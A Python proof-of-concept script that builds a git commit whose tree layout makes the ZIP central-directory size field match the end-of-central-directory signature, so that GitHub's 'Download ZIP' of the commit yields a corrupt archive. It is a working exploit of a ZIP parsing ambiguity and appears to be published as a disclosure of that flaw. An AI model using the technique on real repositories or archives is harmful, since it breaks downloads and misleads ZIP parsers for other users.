#!/usr/bin/env python3

# This program generates a git commit that when downloaded from GitHub using the Download ZIP button results in a corrupt ZIP file.
# We manage to get the size of the central directory field to be the exact signature of the end of central directory record thereby throwing off the search for the signature during initial load of a ZIP file.
# This only causes a problem because GitHub generates a ZIP file comment that has length at least 12 bytes.
# ZIP file comments are generally dangerous to include in ZIP files for this reason.

# The result is here:
# https://github.com/thejoshwolfe/poc-github-zip-exploit/tree/b65497e8a662866aaf6d68dc59608ebb620982db

import os, sys, subprocess
import shlex

def main():
    import argparse
    parser = argparse.ArgumentParser()
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--push", action="store_true", help=
        "Push to github and print the download-as-zip link.")
    group.add_argument("--output", help=
        "Path to write the zip archive from `git archive`.")
    args = parser.parse_args()

    if git("remote", "get-url", "origin") != ["git@github.com:thejoshwolfe/poc-github-zip-exploit.git"]:
        parser.error("this program was designed to work in a specific repo.")

    # build a big chunk of samey file entries.

    # build bottom tier
    [empty_file_hash] = git("hash-object", "-w", "--stdin", input=b'')
    item_line_template = "100644 blob {}\t{}\x00".format(
        empty_file_hash,
        "0" * (106 - len("00.txt")) + "{}.txt",
    )
    # build exponentially bigger trees.
    tree_hashes = []
    for height in range(3):
        [tree_hash] = git("mktree", "-z", input="".join([
            item_line_template.format(str(i).zfill(2))
            for i in range(75)
        ]).encode("utf8"))
        tree_hashes.append(tree_hash)
        item_line_template = "040000 tree {}\t{}\x00".format(
            tree_hash,
            "{}",
        )
    # Now hone in on the correct value.
    [tree_hash] = git("mktree", "-z", input="".join([
        # The big tree:
        "040000 tree {}\t{}\x00".format(tree_hash, "aa"),
        # A medium tree:
        "040000 tree {}\t{}\x00".format(tree_hashes[1], "bb"),
    ] + [
        # Several small trees:
        "040000 tree {}\t{}\x00".format(tree_hashes[0], str(i).zfill(2))
        for i in range(14)
    ] + [
        # Several individual files:
        "100644 blob {}\t{}.txt\x00".format(empty_file_hash, str(i).zfill(2))
        for i in range(94)
    ] + [
        # Last file name's length hits it spot on:
        "100644 blob {}\t{}.txt\x00".format(empty_file_hash, "c"*37)
    ]).encode("utf8"))

    [commit_hash] = git("commit-tree", "-m", "poc malicious github repo demonstrating download-as-zip exploit", tree_hash)

    if args.push:
        git("push", "origin", "--force", "{}:{}".format(
            commit_hash,
            "refs/misc/poc",
        ))
        print(commit_hash)
        print("https://github.com/thejoshwolfe/poc-github-zip-exploit/tree/" + commit_hash)
        print("https://github.com/thejoshwolfe/poc-github-zip-exploit/archive/{}.zip".format(commit_hash))
    elif args.output:
        cmd = [
            "git", "archive", "--format=zip",
            "--prefix=poc-github-zip-exploit-" + commit_hash + "/",
            "--output", args.output,
            commit_hash,
        ]
        print("$ " + shlex.join(cmd))
        subprocess.run(cmd, cwd=git_repo_dir, check=True)

git_repo_dir = "."
def git(*args, input=None):
    cmd = ["git"]
    cmd.extend(args)
    stdout = subprocess.run(cmd, cwd=git_repo_dir, check=True, stdout=subprocess.PIPE, input=input).stdout
    return stdout.decode("utf8").splitlines()

if __name__ == "__main__":
    main()
